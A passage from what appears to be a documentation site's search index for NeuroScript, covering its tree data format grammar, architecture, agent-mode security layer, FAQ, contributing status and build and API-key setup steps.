</ul>"},{"location":"NeuroData/tree/#33-complex-properties-attached-data-block","title":"3.3 Complex Properties (Attached Data Block)","text":"<p>For nodes requiring complex or extensive properties, a standard fenced data block (e.g., JSON, YAML) can be placed immediately following the <code>NODE</code> definition line it applies to. The parser/tool should associate this data block with the preceding node.</p> <p>Example: <pre><code>NODE ConfigNode [label: \"Configuration\"]\n```json\n{\n  \"timeout\": 30,\n  \"retry_policy\": {\n    \"attempts\": 3,\n    \"delay\": \"5s\"\n  },\n  \"enabled_features\": [\"featureA\", \"featureC\"]\n}\n</code></pre>   NODE ChildNode ... # Next node definition starts here <pre><code>### 3.4 Simple Property Definitions (Inline)\n\nSimple properties can be included directly within square brackets `[]` on the `NODE` line.\n* Format: `[key1: value1, key2: value2, ...]`\n* Enclosed in square brackets `[]`.\n* Consists of one or more comma-separated `key: value` pairs.\n* `key`: A simple identifier (letters, numbers, underscore, hyphen).\n* `value`: Can be:\n    * A number (`123`, `4.5`, `-10`).\n    * A boolean (`true`, `false`).\n    * A quoted string (`\"like this\"`, `'or this'`). Allows standard escapes.\n    * An unquoted simple string (no spaces or special characters like `[]:,\"`).\n* (Refer to `graph.md` specification for more detailed value parsing rules if needed).\n\n### 3.5 Comments and Blank Lines\n\nLines starting with `#` or `--` (after optional whitespace) are comments and are ignored. Blank lines are also ignored.\n\n## 4. EBNF Grammar (Draft)\n\n(* EBNF-like notation for NeuroData Tree (.ndtree) - Focus on indentation *)\n```ebnf\ntree_file         ::= { metadata_line | comment_line | blank_line } node_list ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per graph spec *)\nkey               ::= identifier ;\nvalue             ::= rest_of_line ;\n\nnode_list         ::= { node_definition } ;\n\nnode_definition   ::= indentation \"NODE\" whitespace node_id [ whitespace property_block ] newline [ fenced_data_block ] ;\nnode_id           ::= identifier ;\nindentation       ::= { \" \" | \"\\t\" } ; (* Parsed to determine level *)\n\nproperty_block    ::= \"[\" property_list \"]\" ; (* As per graph spec *)\nproperty_list     ::= property_entry { \",\" property_entry } ;\nproperty_entry    ::= optional_whitespace key optional_whitespace \":\" optional_whitespace property_value optional_whitespace ;\nproperty_value    ::= number_literal | boolean_literal | string_literal | simple_string ;\n\nfenced_data_block ::= optional_whitespace \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\nlanguage_tag      ::= identifier ; (* e.g., json, yaml *)\ntext_line         ::= any_character_except_backticks newline ;\n\n(* Standard definitions needed: identifier, number_literal, boolean_literal, string_literal, simple_string, whitespace, newline, comment_line, blank_line *)\n</code></pre> (Note: This EBNF emphasizes the structure. A full parser would need logic to track indentation levels to build the tree hierarchy.)</p>"},{"location":"NeuroData/tree/#5-rendering","title":"5. Rendering","text":"<p>Similar to graphs, <code>.ndtree</code> files can be rendered into various visual formats. Tools could generate: * Text-based tree diagrams: Using characters like <code>\u251c\u2500</code>, <code>\u2514\u2500</code>, <code>\u2502</code>. * DOT Language: For Graphviz visualization, translating the inferred parent-child edges. * Other formats: JSON, XML, etc.</p>"},{"location":"NeuroData/tree/#6-example","title":"6. Example","text":"<pre><code>:: type: Tree\n:: version: 0.1.0\n:: grammar: graph\n:: grammarVer: 0.1.0\n:: id: file-system-example\n:: root: Root\n\nNODE Root [label: \"/\", type: \"dir\"]\n  NODE Documents [label: \"Documents\", type: \"dir\"]\n    NODE Resume.docx [label: \"Resume.docx\", size: 150kb]\n    NODE Report.pdf [label: \"Report.pdf\", size: 2mb]\n      # Example of attaching complex data to Report.pdf\n      ```json\n      {\n        \"author\": \"A. Price\",\n        \"keywords\": [\"report\", \"analysis\", \"neurodata\"],\n        \"revision_history\": [\n          {\"version\": \"1.0\", \"date\": \"2024-01-10\"},\n          {\"version\": \"1.1\", \"date\": \"2024-02-15\"}\n        ]\n      }\n      ```\n  NODE Downloads [label: \"Downloads\", type: \"dir\"]\n    NODE Image.jpg [label: \"Image.jpg\"]\n  NODE Config.sys [label: \"Config.sys\", hidden: true]\n</code></pre>"},{"location":"front/architecture/","title":"Architecture","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: architecture-v0.1 :: status: draft :: dependsOn: docs/front/concepts.md, docs/script spec.md, docs/neurodata_and_composite_file_spec.md, docs/llm_agent_facilities.md, pkg/core/interpreter.go, pkg/neurogo/app.go :: howToUpdate: Review and update component descriptions and interaction flows as the implementation evolves. Update diagrams as needed.  </p>"},{"location":"front/architecture/#neuroscript-architecture","title":"NeuroScript Architecture","text":"<p>This document provides a high-level overview of the main components comprising the NeuroScript ecosystem and how they interact.</p>"},{"location":"front/architecture/#core-components","title":"Core Components","text":"<p>The NeuroScript project consists of three primary parts working together:</p> <ul> <li> <p>neuroscript (<code>.ns.txt</code>): The scripting language itself. It's a simple, readable, procedural language designed for defining \"skills\" or procedures. It combines basic control flow (<code>IF</code>, <code>WHILE</code>, <code>FOR EACH</code>), state management (<code>SET</code>), and crucially, calls to external logic (<code>CALL TOOL.*</code>, <code>CALL LLM</code>, <code>CALL OtherProcedure</code>). See the Language Specification.</p> </li> <li> <p>neurodata (<code>.nd*</code>): A suite of simple, plain-text data formats designed for clarity and ease of parsing. Examples include checklists (<code>.ndcl</code>), tables (<code>.ndtable</code>), graphs (<code>.ndgraph</code>), trees (<code>.ndtree</code>), map schemas (<code>.ndmap_schema</code>), and more. These formats allow structured data exchange between humans, AI, and tools. See the NeuroData Overview and specific format specifications in docs/NeuroData/.</p> </li> <li> <p>neurogo: The reference implementation, written in Go [since you program mostly in golang]. It serves two main roles:</p> <ol> <li>Interpreter: Parses and executes <code>.ns.txt</code> script files directly, managing state and calling registered TOOLs or LLMs as instructed by the script.</li> <li>Agent Backend (Experimental): Acts as a secure execution environment for an external LLM (like Gemini). It receives requests from the LLM (via Function Calling), validates them against security policies (allowlists, sandboxing), executes permitted TOOLs, and returns results to the LLM. See the Agent Facilities Design. See the neurogo source code and CLI implementation.</li> </ol> </li> </ul>"},{"location":"front/architecture/#component-interaction-workflow","title":"Component Interaction / Workflow","text":"<p>How these components interact depends on the mode <code>neurogo</code> is operating in:</p>"},{"location":"front/architecture/#1-script-execution-mode","title":"1. Script Execution Mode","text":"<p>This is the default mode when running <code>neurogo</code> with a script file or procedure name.</p> <p>[Diagram Suggestion: Flowchart for Script Execution Mode: Start -&gt; <code>neurogo</code> CLI receives command (script path, args) -&gt; <code>neurogo</code> parses <code>.ns.txt</code> -&gt; Interpreter loads procedure -&gt; Interpreter executes step -&gt; Evaluation (Expression/Variable?) -&gt; Condition (IF/WHILE/FOR?) -&gt; Action (SET/EMIT/RETURN?) -&gt; Tool Call (-&gt; Go Func) -&gt; LLM Call (-&gt; API) -&gt; Update Interpreter State -&gt; Loop to next step or End.]</p> <ul> <li>Initiation: User executes <code>neurogo</code> via the command line, providing the path to a <code>.ns.txt</code> file (or a specific procedure within a library) and any necessary arguments or flags (like <code>-lib</code>).</li> <li>Parsing: <code>neurogo</code> reads the specified file(s) and uses the NeuroScript parser (built with ANTLR, see parser_api.go) to create an Abstract Syntax Tree (AST) representing the procedures.</li> <li>Interpretation: The <code>Interpreter</code> (interpreter.go) walks the AST of the target procedure.</li> <li>Execution: For each statement:<ul> <li><code>SET</code>: Evaluates the expression and updates the interpreter's current scope.</li> <li><code>IF</code>/<code>WHILE</code>/<code>FOR EACH</code>: Evaluates conditions/collections and controls the execution flow.</li> <li><code>CALL ProcedureName</code>: Pushes a new scope and starts interpreting the called procedure.</li> <li><code>CALL TOOL.FunctionName</code>: Looks up the tool in the <code>ToolRegistry</code> (tools_register.go), validates arguments, executes the corresponding Go function, and stores the result in <code>LAST</code>.</li> <li><code>CALL LLM</code>: Formats the prompt, sends it to the configured LLM API (llm.go), and stores the response text in <code>LAST</code>.</li> <li><code>RETURN</code>: Evaluates the optional expression and passes the result back to the caller (or exits the script).</li> <li><code>EMIT</code>: Evaluates the expression and prints its string form to standard output.</li> </ul> </li> <li>Output: The primary output is typically generated via <code>EMIT</code> statements or the final <code>RETURN</code> value of the main procedure.</li> </ul>"},{"location":"front/architecture/#2-agent-mode","title":"2. Agent Mode","text":"<p>This mode is activated using the <code>-agent</code> flag and related security flags (<code>-allowlist</code>, <code>-denylist</code>, <code>-sandbox</code>).</p> <p>[Diagram Suggestion: Flowchart illustrating Agent Mode: User Box -&gt; Arrow to -&gt; LLM Service Box -&gt; Arrow (Function Call Request) -&gt; NeuroGo Agent Box [contains inner boxes: Security Layer (Allowlist/Validate) -&gt; Tool Executor] -&gt; Arrow (TOOL Execution) -&gt; Local Environment Box -&gt; Arrow (Result) -&gt; NeuroGo Agent Box -&gt; Arrow (Function Response) -&gt; LLM Service Box -&gt; Arrow (Final Answer) -&gt; User Box.]</p> <ul> <li>Initiation: User interacts with an external application (e.g., a chat interface) which communicates with an LLM (like Gemini). <code>neurogo -agent</code> runs as a background process or service.</li> <li>LLM Planning: The LLM receives the user prompt and its list of available \"functions\" (which correspond to the NeuroGo TOOLs declared via configuration). If it decides a tool is needed, it generates a Function Call request.</li> <li>Request Reception: The <code>neurogo</code> agent (app_agent.go) receives the structured Function Call request from the LLM API.</li> <li>Security Validation: The request (tool name, arguments) is passed to the <code>SecurityLayer</code> (security.go).<ul> <li>Checks if the tool is on the allowlist and not on the denylist.</li> <li>Validates and potentially sanitizes arguments. Crucially, file paths are validated against the sandbox root using <code>SecureFilePath</code> logic.</li> <li>Rejects the request if any check fails.</li> </ul> </li> <li>Tool Execution: If validation passes, the agent calls the appropriate Go function for the requested TOOL via the <code>ToolRegistry</code>, passing the validated arguments. The tool executes within the security context (e.g., filesystem access confined to the sandbox).</li> <li>Response Formatting: The result (or error) from the tool execution is formatted into a Function Response structure expected by the LLM API.</li> <li>LLM Continuation: The agent sends the Function Response back to the LLM API. The LLM uses this result to continue its reasoning and either generate another Function Call or formulate a final text response for the user.</li> <li>Output: The final LLM text response is relayed back to the user via the initial application.</li> </ul>"},{"location":"front/architecture/#diagrams","title":"Diagrams","text":"<p>[Diagram Suggestion: High-level block diagram showing the 'neurogo' executable as the central component. It reads/writes '.ns.txt Files (Skills)' and '.nd* Files (Data)'. It contains an 'Interpreter/Agent Core' which uses 'Built-in TOOLs (Go Code)' and interacts via API with an external 'LLM Service'.]</p> <p>(Placeholder for Overall Architecture Diagram)</p> <p>[Diagram Suggestion: Flowchart for Script Execution Mode: Start -&gt; <code>neurogo</code> CLI receives command (script path, args) -&gt; <code>neurogo</code> parses <code>.ns.txt</code> -&gt; Interpreter loads procedure -&gt; Interpreter executes step -&gt; Evaluation (Expression/Variable?) -&gt; Condition (IF/WHILE/FOR?) -&gt; Action (SET/EMIT/RETURN?) -&gt; Tool Call (-&gt; Go Func) -&gt; LLM Call (-&gt; API) -&gt; Update Interpreter State -&gt; Loop to next step or End.]</p> <p>(Placeholder for Script Execution Flow Diagram)</p> <p>[Diagram Suggestion: Flowchart illustrating Agent Mode: User Box -&gt; Arrow to -&gt; LLM Service Box -&gt; Arrow (Function Call Request) -&gt; NeuroGo Agent Box [contains inner boxes: Security Layer (Allowlist/Validate) -&gt; Tool Executor] -&gt; Arrow (TOOL Execution) -&gt; Local Environment Box -&gt; Arrow (Result) -&gt; NeuroGo Agent Box -&gt; Arrow (Function Response) -&gt; LLM Service Box -&gt; Arrow (Final Answer) -&gt; User Box.]</p> <p>(Placeholder for Agent Mode Flow Diagram)</p>"},{"location":"front/concepts/","title":"Core Concepts","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: concepts-v0.1 :: status: draft :: dependsOn: docs/script spec.md, docs/metadata.md, docs/neurodata_and_composite_file_spec.md, pkg/core/tools_register.go, docs/ns/tools/index.md, docs/ns/tools/move_file.md, docs/ns/tools/query_table.md, docs/ns/tools/go_update_imports_for_moved_package.md :: howToUpdate: Review against core project goals and implemented features. Update feature list and links as functionality evolves.  </p>"},{"location":"front/concepts/#core-concepts-features-of-neuroscript","title":"Core Concepts &amp; Features of NeuroScript","text":"<p>This document outlines the fundamental principles driving NeuroScript's design and lists its key features.</p>"},{"location":"front/concepts/#principles","title":"Principles","text":"<p>NeuroScript development adheres to these core principles to ensure it effectively facilitates communication between humans, AI, and computers:</p> <ol> <li> <p>Readability: All users (human, AI, or computer executing parsing logic) must be able to easily read and understand the intent of NeuroScript files (<code>.ns.txt</code>) and NeuroData (<code>.nd*</code>) formats. Simple edits should ideally be possible without constantly referring to documentation. NS formats prioritize being self-describing.     [Diagram Suggestion: Simple icons representing Human, AI, Computer all looking at a readable text document.]</p> </li> <li> <p>Executability: The procedural steps defined in NeuroScript should be clear enough that any participant could, in principle, follow the logic and perform the actions described, whether manually or through automated interpretation. This supports auditing and understanding workflow.</p> </li> <li> <p>Clarity: The primary focus is always on clear communication. Features, syntax, and data structures favor explicitness and obviousness over achieving maximum concision or supporting highly complex, obscure constructs. The \"mile wide, inch deep\" philosophy applies here.</p> </li> <li> <p>Embedded Metadata: Wherever practical, NeuroScript files should contain standard metadata (<code>:: key: value</code>) indicating their version, dependencies, and potentially instructions for maintenance. This promotes better organization and understanding of interrelationships within a project. See the Metadata Specification.</p> </li> </ol>"},{"location":"front/concepts/#key-features","title":"Key Features","text":"<p>NeuroScript achieves its goals through the following key features:</p> <p>[Diagram Suggestion: High-level block diagram showing 'neurogo' interacting with '.ns.txt Scripts (Skills)', '.nd* NeuroData', 'External TOOLs (Go Code)', and 'LLM API'.]</p> <ul> <li>Structured Pseudocode for AI/Human/Computer: Provides a way to write procedures (<code>DEFINE PROCEDURE</code>) that combine simple, imperative steps (like <code>SET</code>, <code>EMIT</code>, <code>RETURN</code>) with loops (<code>FOR EACH</code>, <code>WHILE</code>), conditions (<code>IF/THEN/ELSE</code>), and calls to more complex logic (other procedures, tools, LLMs). See the Language Specification.</li> <li>Explicit Reasoning Flow: Moves complex workflows out of ambiguous natural language or hidden model \"thoughts\" into a reviewable, step-by-step script format.</li> <li>Self-Documenting Procedures: The mandatory <code>COMMENT:</code> block within each procedure requires defining <code>PURPOSE</code>, <code>INPUTS</code>, <code>OUTPUT</code>, and <code>ALGORITHM</code>, ensuring that the \"skill\" captured is understandable and reusable. See the Language Specification.</li> <li>Tool Integration: A core concept is extending capabilities via <code>CALL TOOL.FunctionName(...)</code>. This integrates external Go functions for specific tasks. Numerous tools are built-in, covering areas like Filesystem (e.g., TOOL.MoveFile spec), Git, String manipulation, Shell execution (use with caution!), Go build/test (e.g., TOOL.GoUpdateImports spec), Vector DB operations (Mock), Metadata Extraction, NeuroData Checklist Parsing, NeuroData Block Extraction, NeuroData Table Querying (TOOL.QueryTable spec), Math operations, List operations, and more. See the Tool Specification Index for available detailed specs or tools_register.go for the source list.</li> <li>LLM Integration: <code>CALL LLM(prompt)</code> provides a straightforward way to delegate tasks suited to Large Language Models, like text generation, summarization, or complex analysis. See llm.go.</li> <li>Rich Data Handling: Supports basic literals (string, number, boolean) and composite types like lists (<code>[...]</code>) and maps (<code>{...}</code>) directly in the syntax, including element access (<code>list[index]</code>, <code>map[\"key\"]</code>). See Language Specification.</li> <li>Basic Control Flow: Standard <code>IF/THEN/ELSE/ENDBLOCK</code>, <code>WHILE/DO/ENDBLOCK</code>, and <code>FOR EACH/IN/DO/ENDBLOCK</code> constructs allow for essential procedural logic. <code>FOR EACH</code> supports iteration over lists, map keys, and string characters. See interpreter_control_flow.go.</li> <li>CLI Interpreter (<code>neurogo</code>): The reference implementation (<code>neurogo</code>) is a command-line tool written in Go that parses and executes <code>.ns.txt</code> files. It supports loading libraries of procedures, debug flags, and different execution modes. See Installation &amp; Setup and neurogo source.</li> <li>Agent Mode (Experimental): <code>neurogo</code> can operate as a secure backend agent, allowing an external LLM (like Gemini) to request the execution of allowlisted <code>TOOL.*</code> functions via its Function Calling API. This enables AI-driven interaction with the local environment under strict security controls. See the Agent Facilities Design.     [Diagram Suggestion: Flowchart illustrating Agent Mode: User -&gt; LLM -&gt; NeuroGo Agent (Security Layer -&gt; Tool Executor) -&gt; Local Env -&gt; NeuroGo Agent -&gt; LLM -&gt; User.]</li> <li>VS Code Extension: Basic syntax highlighting support for <code>.ns.txt</code> files is available to improve the editing experience (vscode-neuroscript).</li> <li>NeuroData Parsing: Built-in tools facilitate working with specific NeuroData formats like Checklists (<code>.ndcl</code>) and extracting data from composite files using fenced blocks. See NeuroData tools.</li> </ul>"},{"location":"front/contributing/","title":"Contributing","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: contributing-v0.1 :: status: draft :: dependsOn: docs/RoadMap.md, docs/development checklist.md, LICENSE, docs/front/installation.md :: howToUpdate: Update contribution process details when the project is ready to accept external contributions. Keep links to roadmap/checklist current.  </p>"},{"location":"front/contributing/#contributing-to-neuroscript","title":"Contributing to NeuroScript","text":""},{"location":"front/contributing/#current-status-planning-early-development","title":"Current Status: Planning &amp; Early Development","text":"<p>Thank you for your interest in contributing to NeuroScript!</p> <p>We are excited about building a community around this project. However, NeuroScript is currently in a very early and rapidly evolving stage of development. As noted in the main README.md, major components are undergoing constant updates, and the core APIs and formats are not yet stable.</p> <p>Therefore, we are not formally accepting external contributions (like Pull Requests) at this exact moment. (\"NOT YET :P\")</p> <p>This allows the core team (currently Andrew Price and AI collaborators like myself) to establish the foundational architecture and stabilize the key specifications without introducing excessive coordination overhead too early.</p>"},{"location":"front/contributing/#how-to-contribute-in-the-future","title":"How to Contribute (In the Future)","text":"<p>Once the project reaches a more stable phase (likely post-v0.1 or as indicated in the Roadmap), we plan to welcome contributions via the standard GitHub workflow:</p> <ol> <li>Discussions &amp; Issues: Please start by opening a GitHub Issue to discuss potential bugs, feature ideas, or proposed changes before submitting code.</li> <li>Pull Requests: Submit Pull Requests against the <code>main</code> branch (or a designated development branch) with clear descriptions of your changes.</li> </ol>"},{"location":"front/contributing/#areas-for-contribution-ideas","title":"Areas for Contribution Ideas","text":"<p>When we are ready for contributions, good places to look for ideas or tasks include:</p> <ul> <li>Roadmap: The high-level docs/RoadMap.md outlines major planned features and development phases.</li> <li>Development Checklist: The more granular docs/development checklist.md tracks specific planned features, tasks, and known issues.</li> <li>Tooling: Implementing new <code>TOOL.*</code> functions (especially integrations with external services or libraries).</li> <li>NeuroData Formats: Designing specifications for new data formats or implementing parsers/tools for existing ones (docs/NeuroData/).</li> <li>Interpreter Enhancements: Improving error handling, performance, or adding advanced language features.</li> <li>Documentation: Writing more examples, tutorials, or refining existing specifications for clarity.</li> <li>Testing: Increasing unit and integration test coverage.</li> <li>VS Code Extension: Enhancing the extension with features beyond basic syntax highlighting.</li> </ul>"},{"location":"front/contributing/#development-setup","title":"Development Setup","text":"<ul> <li>The core <code>neurogo</code> interpreter is written in Go. See the Installation &amp; Setup guide for prerequisites (Go version, Git).</li> <li>Please adhere to standard Go formatting (<code>gofmt</code>).</li> <li>Follow the project's core Principles (Readability, Clarity, etc.) in any code or documentation contributions.</li> </ul>"},{"location":"front/contributing/#license","title":"License","text":"<p>By contributing, you agree that your contributions will be licensed under the project's MIT License (see LICENSE file).</p> <p>We appreciate your understanding and look forward to collaborating with the community in the future!</p>"},{"location":"front/faq/","title":"FAQ","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: faq-v0.1 :: status: draft :: dependsOn: docs/front/concepts.md, docs/script spec.md, docs/neurodata_and_composite_file_spec.md, docs/metadata.md, pkg/core/tools_register.go :: howToUpdate: Add new questions as they arise, update answers based on project changes, ensure links remain valid.  </p>"},{"location":"front/faq/#frequently-asked-questions-faq","title":"Frequently Asked Questions (FAQ)","text":""},{"location":"front/faq/#general-what-is-neuroscript","title":"General / What is NeuroScript?","text":"<p>Q: What problem does NeuroScript aim to solve? A: NeuroScript tackles the communication friction inherent in complex systems where humans, AI agents (like LLMs), and traditional computer programs need to collaborate. It aims to provide clearer, more reliable, and repeatable ways to exchange procedural knowledge (\"skills\") and structured data than using natural language or complex code interfaces alone. See Why NeuroScript? for more motivation.</p> <p>Q: Who is NeuroScript for? A: It's designed for developers building hybrid systems, AI engineers creating agentic workflows, technical teams needing clear process documentation, and potentially anyone looking for a structured way to define and share procedures that can be understood and executed by different types of actors (human, AI, computer).</p> <p>Q: What are the core principles? A: Readability, Executability, Clarity, and Embedded Metadata. The goal is formats that are self-describing, auditable, and prioritize clarity over concision. See Principles.</p> <p>Q: Is NeuroScript production-ready? A: No. As stated clearly in the main README.md, NeuroScript is in EARLY DEVELOPMENT and undergoing massive, constant updates. It should not be used in production environments at this stage.</p>"},{"location":"front/faq/#neuroscript-language-nstxt","title":"NeuroScript Language (<code>.ns.txt</code>)","text":"<p>Q: Is NeuroScript a full programming language? A: It\u2019s more of a structured pseudocode or orchestration language. It's focused on providing procedural scaffolding, managing state (<code>SET</code>), and coordinating calls to external logic (LLMs via <code>CALL LLM</code>, external tools via <code>CALL TOOL.*</code>, other NeuroScript Procedures via <code>CALL ProcedureName</code>). Complex computation is typically delegated to tools or LLMs. See the Language Specification.</p> <p>Q: What's the <code>COMMENT:</code> block for? Why is it mandatory? A: The <code>COMMENT:</code> block serves as a structured docstring for each <code>DEFINE PROCEDURE</code>. It's mandatory to enforce the principle of self-documenting skills. It includes standardized sections like <code>PURPOSE</code>, <code>INPUTS</code>, <code>OUTPUT</code>, <code>ALGORITHM</code>, <code>LANG_VERSION</code>, <code>CAVEATS</code>, and <code>EXAMPLES</code>, making procedures understandable and discoverable by both humans and AI. See the Language Specification.</p> <p>Q: How does variable substitution work? What's <code>EVAL()</code> for? A: NeuroScript uses explicit evaluation for placeholders. Standard expressions (like in <code>SET variable = \"Hello \" + name</code> or <code>EMIT message</code>) evaluate variables/literals directly to their raw values. Placeholders like <code>{{variable}}</code> or <code>{{LAST}}</code> are only substituted when processed by the <code>EVAL(string_expression)</code> function. <code>EVAL</code> first evaluates its argument to get a string, then scans that string for placeholders and replaces them with current variable values. See Core Concepts in concepts.md and the Language Specification.</p> <p>Q: What does <code>LAST</code> do? A: The <code>LAST</code> keyword evaluates to the raw value returned by the most recently executed <code>CALL</code> statement (whether calling another procedure, <code>LLM</code>, or a <code>TOOL.*</code>). See the Language Specification.</p> <p>Q: How are NeuroScript procedures/skills stored and found? A: Procedures are defined in <code>.ns.txt</code> files. These files are intended to be stored in a library structure (e.g., a directory specified via the <code>-lib</code> flag in <code>neurogo</code>, potentially managed by Git). Discovery is planned via tools like <code>TOOL.SearchSkills</code> (currently mocked) which would likely use vector embeddings generated from the procedure docstrings.</p> <p>Q: How does versioning work? A: There are two main levels:     * File Content Version: Use <code>:: version: &lt;semver&gt;</code> metadata at the top of any file (<code>.ns.txt</code>, <code>.nd*</code>, <code>.md</code>, etc.) to track changes to that specific file's content. See Metadata Specification. The older <code>FILE_VERSION \"...\"</code> directive in <code>.ns.txt</code> is supported but deprecated in favor of <code>:: version:</code>.     * Language Compatibility: Use <code>LANG_VERSION: &lt;semver&gt;</code> inside a procedure's <code>COMMENT:</code> block to indicate which version of the NeuroScript language specification the procedure targets. See the Language Specification.</p>"},{"location":"front/faq/#neurodata-formats-nd","title":"NeuroData Formats (<code>.nd*</code>)","text":"<p>Q: What is NeuroData? A: NeuroData is a collection of simple, plain-text, human-readable formats designed for representing structured data like checklists (<code>.ndcl</code>), tables (<code>.ndtable</code>), graphs (<code>.ndgraph</code>), trees (<code>.ndtree</code>), schemas (<code>.ndmap_schema</code>), forms (<code>.ndform</code>), etc., within the NeuroScript ecosystem. See the NeuroData Overview.</p> <p>Q: What is a \"composite file\"? A: A file (typically Markdown <code>.md</code>) that contains multiple fenced code/data blocks, potentially including NeuroScript code, NeuroData formats, or other language snippets, interspersed with explanatory text. NeuroScript provides tools (<code>TOOL.BlocksExtractAll</code>) for parsing these files and extracting the structured blocks based on their fence tags and <code>:: id:</code> metadata. See the NeuroData Overview.</p> <p>Q: How do references like <code>[ref:...]</code> work? A: They provide a standard way to link to other resources (files or specific blocks within files) within the project. The syntax is <code>[ref:&lt;location&gt;]</code> for files or <code>[ref:&lt;location&gt;#&lt;block_id&gt;]</code> for blocks, where <code>&lt;location&gt;</code> is usually <code>this</code> or a relative path (using <code>/</code>). Tools resolving these references must use security mechanisms like <code>SecureFilePath</code>. See the References Specification.</p>"},{"location":"front/faq/#neurogo-interpreteragent","title":"<code>neurogo</code> Interpreter/Agent","text":"<p>Q: How do I run a NeuroScript procedure? A: Use the <code>neurogo</code> command-line tool. Specify the library path (<code>-lib</code>), the file containing the procedure, and the procedure name, followed by any arguments. Example: <code>./neurogo -lib ./library ./library/ask_llm.ns.txt AskCapitalCity \"Canada\"</code>. See Installation &amp; Setup.</p> <p>Q: What are the debug flags? A: <code>-debug-ast</code> prints the Abstract Syntax Tree after parsing. <code>-debug-interpreter</code> provides step-by-step logging of the interpreter's execution flow. See Installation &amp; Setup.</p> <p>Q: What is Agent Mode (<code>-agent</code>)? A: An experimental mode where <code>neurogo</code> acts as a secure backend for an LLM (like Gemini). Instead of executing a script directly, it listens for function call requests from the LLM, validates them against allow/deny lists and security rules, executes permitted <code>TOOL.*</code> functions within a sandbox, and returns the results to the LLM. See the Agent Facilities Design and Installation &amp; Setup.</p>"},{"location":"front/faq/#tools-tool","title":"Tools (<code>TOOL.*</code>)","text":"<p>Q: Can I integrate external tools besides LLMs? A: Yes\u2014this is a core feature. You can define Go functions and register them using the <code>ToolRegistry</code> (<code>pkg/core/tools_register.go</code>). They become available via <code>CALL TOOL.YourFunctionName(...)</code>. Numerous filesystem, string, Git, Go, NeuroData, and Metadata tools are already included.</p> <p>Q: Is <code>TOOL.ExecuteCommand</code> safe? A: Potentially dangerous. Executing arbitrary shell commands carries inherent security risks. While <code>neurogo</code> provides some basic safeguards (like attempting path validation if arguments look like paths), it's highly recommended to disable <code>TOOL.ExecuteCommand</code> completely when running in Agent Mode or executing untrusted scripts, using the <code>-denylist</code> flag or similar security configurations. See the Agent Facilities Design.</p> <p>Q: What is <code>SecureFilePath</code>? A: It's a security mechanism used internally by filesystem-related tools (<code>TOOL.ReadFile</code>, <code>TOOL.WriteFile</code>, <code>TOOL.ListDirectory</code>, etc.). When <code>neurogo</code> is run with a sandbox directory (<code>-sandbox</code>), <code>SecureFilePath</code> ensures that any file paths manipulated by tools resolve safely within that designated directory, preventing access to files outside the sandbox (e.g., via <code>../</code> traversal). This is crucial for agent security. See <code>pkg/core/security.go</code> and related tool implementations.</p>"},{"location":"front/faq/#contributing-future","title":"Contributing / Future","text":"<p>Q: How do I version-control procedures? A: Store <code>.ns.txt</code> files (and related <code>.nd*</code> files) in a Git repository. Use <code>TOOL.GitAdd</code> and <code>TOOL.GitCommit</code> (or external Git commands) to manage changes. Use <code>:: version:</code> metadata in files and <code>LANG_VERSION:</code> in procedure docstrings to track content versions.</p> <p>Q: How can I contribute? A: Contributions are planned but the project is currently in very early, rapid development (\"NOT YET :P\"). When open, contributions will likely involve adding tools, NeuroData formats, enhancing the interpreter, improving documentation, or adding tests. See Contributing, the Roadmap, and the Development Checklist for potential areas.</p>"},{"location":"front/installation/","title":"Installation","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: installation-v0.1 :: status: draft :: dependsOn: cmd/neurogo/main.go, pkg/neurogo/config.go, docs/build.md :: howToUpdate: Update Go version, build steps, or CLI flags/examples as the project evolves.  </p>"},{"location":"front/installation/#installation-setup-neurogo-cli","title":"Installation &amp; Setup (<code>neurogo</code> CLI)","text":"<p>STATUS: EARLY DEVELOPMENT</p> <p>Under massive and constant updates, do not use yet. This guide provides instructions for building and running the <code>neurogo</code> command-line tool from source.</p>"},{"location":"front/installation/#1-prerequisites","title":"1. Prerequisites","text":"<ul> <li>Go Environment: You need a working Go installation. Version 1.21 or later is recommended.</li> <li>Git: The Git command-line tool is required for version control interaction (used by some <code>TOOL.Git*</code> functions) and potentially for fetching dependencies.</li> <li>(Optional) Java &amp; ANTLR: If you need to regenerate the NeuroScript parser code from the <code>.g4</code> grammar file (<code>pkg/core/NeuroScript.g4</code>), you will need Java and the ANTLR tool itself. However, the generated Go parser files are included in the repository, so ANTLR is NOT required just to build and run <code>neurogo</code>. See docs/build.md for parser generation details.</li> </ul>"},{"location":"front/installation/#2-building-neurogo","title":"2. Building <code>neurogo</code>","text":"<ol> <li>Clone/Download Source: Obtain the <code>neuroscript</code> project source code (e.g., via <code>git clone</code>).</li> <li>Navigate to Root: Open your terminal and change directory to the project's root folder (the one containing <code>go.mod</code>).</li> <li>Build: Run the standard Go build command:     <pre><code>go build -o neurogo ./cmd/neurogo\n</code></pre></li> <li>Result: This command compiles the code and creates the <code>neurogo</code> executable file in the current directory (the project root). Go will automatically handle downloading necessary dependencies defined in <code>go.mod</code>.</li> </ol>"},{"location":"front/installation/#3-configuration","title":"3. Configuration","text":""},{"location":"front/installation/#llm-connection-optional","title":"LLM Connection (Optional)","text":"<ul> <li>If you plan to use NeuroScript features that interact with Large Language Models (<code>CALL LLM</code>), you need to provide API credentials.</li> <li>Primary Method (Recommended): Set the <code>GEMINI_API_KEY</code> environment variable:     <pre><code>export GEMINI_API_KEY=\"YOUR_API_KEY_HERE\"\n</code></pre></li> <li>Alternative Method: Use the <code>-apikey</code> command-line flag when running <code>neurogo</code>:     <pre><code>./neurogo -apikey \"YOUR_API_KEY_HERE\" ...\n</code></pre></li> <li>Default Model: The system currently defaults to using Google's <code>gemini-1.5-pro-latest</code> model.</li> <li>Changing Model (Agent Mode): When running in Agent mode, you can specify a different Gemini model using the <code>-model</code> flag:     <pre><code>./neurogo -agent -model models/gemini-1.5-flash-latest ...\n</code></pre></li> </ul>"},{"location":"front/installation/#4-running-neurogo-script-execution-mode","title":"4. Running <code>neurogo</code> (Script Execution Mode)","text":"<p>This is the primary mode for executing <code>.ns.txt</code> scripts directly.</p> <ul> <li>Basic Syntax: <pre><code>./neurogo [flags] 